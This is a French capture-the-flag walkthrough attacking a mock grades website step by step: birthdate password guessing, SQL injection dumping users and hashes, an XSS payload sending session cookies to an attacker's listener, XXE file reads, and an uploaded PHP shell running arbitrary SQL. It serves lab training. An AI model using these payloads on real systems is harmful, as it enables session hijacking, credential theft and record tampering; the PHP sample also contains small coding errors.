# Solutions

## Etape 1 : Social Engineering

Le mot de passe est probablement lié à son fils, Brandon. La photo montre clairement que l'enfant a 1 an le 9 novembre 2017. On peut par déduction essayer comme mot de passe la date de naissance : 09112016.

## Etape 2 : Injection SQL

Sur la page d'affichage des cours, on remarque qu'on a une URL qui terme par `code=xxx`. Il y a probablement derrière une requête du type `SELECT * FROM grades WHERE code="xxx";`.

On souhaiterait avoir une requête du type `SELECT * FROM grades WHERE code="" OR "1"="1` par exemple. Pour cela, remplacer dans l'URL `code=" OR "1"="1;`. 

## Etape 3 : Mot de passe faible

On ne peut pas réaliser de requête UPDATE dans la table car l'utilisateur n'a pas les droits. Cependant, il est possible de récupérer tous les utilisateurs. Dans la majorité des systèmes, la table des utilisateurs s'appelle `users`.

On fait une nouvelle injection SQL. Cette fois ci, on annule la première requête SELECT et on fait une union avec la requête que l'on souhaite. On souhaiterait par exemple obtenir `SELECT * FROM grades WHERE code="" AND 1=0 UNION SELECT * FROM users;`. On peut utiliser les caractères `--` afin de ne pas s'inquiéter des éventuels caractères après le test sur code qui rendrait notre seconde requête invalide. L'injection est alors `" AND 1=0 UNION SELECT * FROM users;--`. 

Un problème se pose : il faut que les 2 requêtes renvoient le même nombre de champs. Afin de déterminer le nombre de champs renvoyés et leur position, on peut par exemple procéder par étapes avec des `SELECT 1`, `SELECT 1,2`, ... On remarque que 3 champs sont récupérés. Il nous faut leur nom.

Dans une table `users`, on a souvent des champs `username` et ̀password`. Récupérons donc ces champs avec l'injection : 
̀" AND 1=0 UNION SELECT username, password, 3 FROM users;--`. 

On récupère les hash des mots de passe. Si les mots de passe ne sont pas salés, on peut utiliser une rainbow table. On peut aussi utiliser un programme spécifique comme john ou hashcat. En l'occurence, Crack-Station arrive à cracker 2 de ces hash : la date de naissance utilisée à l'étape 1 et un nouveau mot de passe.

Utiliser ce nouveau mot de passe afin de se connecter...

## Etape 4 : Injection XSS

Depuis ce nouvel utilisateur, il est possible d'ajouter des news sur la page d'accueil. On nous indique que la secrétaire visite régulièrement cette page, ce qui semble indiquer qu'une injection XSS est à réaliser afin de voler sa session.

Le principe de l'attaque est de récupérer les cookies de l'utilisateur (dont son cookie de session). Pour ce faire, on injecte dans la page du code javascript afin d'envoyer une requête vers une machine que l'on contrôle contenant ces informations.

On essaie de rentrer des balises HTML dans le champ message du formulaire : ça marche. Par contre, les balises `<script>` sont refusées. On peut utiliser la balise image. 

On peut par exemple exploiter l'attribut `onerror` de l'élément `<img>`. Cet attribut permet d'exécuter du code javascript lorsque l'attribut `src` contient une adresse invalide ou qui ne répond pas. De ce fait, on peut ajouter l'élement :`<img src="blabla" onerror="this.src='http://<mon-adresse-ip>/' + document.cookie"> `. Lorsque la victime interprètera ce code, il enverra une requête HTTP GET afin de récupérer une image à l'adresse `http://<mon-adresse-ip>:<mon-port-d-ecoute>/<ses-cookies>`. 

Cette requête peut être interceptée facilement en utilisant l'utilitaire `netcat` : `nc -l -p <mon-port>`.

On récupère un cookie PHPSESSID (l'url est de la forme `http://<mon-adresse-ip>:<mon-port-d-ecoute>/PHPSESSID=yyy`). En injectant de cookie dans son navigateur, on est authentifié en tant que `salmon`. En allant sur la page d'accueil, on récupère le flag.

## Etape 5 : Injection XEE

L'objectif est d'accéder aux sources du site. `salmon` a la possibilité d'uploader des fichiers. On nous indique qu'il ne peut uploader que des fichiers ̀.xml`. Un exemple est présent sur la page. 

Si on upload le fichier de test, on remarque que son contenu est ensuite affiché. Le fichier est donc parsé. On peut essayer de faire une injection XEE. 

On peut dans un premier temps essayer de récupérer un fichier classique comme `/etc/passwd` en utilisant une injection : 
```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [ <!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<grades>
  <grade>
    <name>&xxe;</name>
    <grade>19</grade>
    <class>CS-130</class>
  </grade>
</grades>
```

En essayant de récupérer les sources (par exemple index.php), on s'apperçoit que rien ne s'affiche. Cela est du au fait que le fichier XML devient invalide à cause des chevrons contenu dans les fichiers PHP. 

Afin de contourner cette limite, on peut utiliser un filtre PHP et récupérer le contenu encodé en base64 : 
```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE replace [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
<grades>
  <grade>
    <name>&xxe;</name>
    <grade>19</grade>
    <class>CS-130</class>
  </grade>
</grades>
```

On obtient une longue chaîne de base64. On utilise un décodeur base64 afin de récupérer le texte sous forme lisible. On peut par exemple utiliser la commande linux `echo <chaine-base64> | base64 -d`. 

On récupère alors le code source du fichier `index.php`. On remarque que ce fichier inclut un autre fichier nommé `../config/flags.php`. Il semble intéressant ! En utilisant le même procédé que pour `index.php`, on récupère le fichier qui contient les 4 premiers flags et notre cinquiète flag.

## Etape 6 : Unrestricted File Upload 

L'objectif de cette étape est de modifier la note identifiée à l'étape 2. 

On nous indique qu'une backdoor a été ajoutée au site. Cette étape peut demander une recherche assez importante de la part de l'attaquant car il doit comprendre comment le site fonctionne.

La backdoor se situe dans le formulaire d'upload de fichiers `.xml` utilisés précédemment. Le formulaire accepte des fichiers d'une extension particulière (`phpbigbackdoorofthedeath`) qu'il transforme en fichiers `.php` après les avoir uploadé tels quels dans un répertoire public `uploads`.

On peut donc uploader un fichier `php` et l'exécuter.

En lisant le code source à l'étape 5, on a pu s'appercevoir qu'un fichier `config/database.php` contient les identifiants permettant de se connecter à la base de données. Ce fichier contient deux comptes, dont un, `admin`, semble permettre la modification des données (contrairement au premier `readonly`). 

On va alors écrire du code PHP permettant de modifier la note en se connectant à la base de données. Une fois la note modifiée, l'énoncé annonce qu'un flag sera ajouté dans la table flags. 

On peut utiliser le code suivant : 
```php 
<?php 

$mysqli = new mysqli('localhost', '<username>', '<mot-de-passe>', '<database>');

$res = $mysqli->query($_GET['sql'];);

if (!$res) {
    die('Error with the database');
}

while ($data = $res->fetch_assoc()) {
    var_dump($data);
    echo '<br/><br/>';
}

$result->free();
$mysqli->close();

?>
```

Ce code permet d'exécuter la requête SQL contenue dans l'arguement `sql`. On peut par exemple l'appeler avec dans l'URL `?sql=SELECT * FROM users`. 

On récupère d'abord des informations sur la structure de la base avec `SHOW TABLES;`. On peut ensuite récupérer le contenu complet de la table `grades` avec `SELECT * FROM grades;`. Finalement, on effectue une requête UPDATE sur la table `grades` pour modifier notre note. 

Le flag se situe dans la table flags, donc on termine par une requête `SELECT * FROM flags;`. 
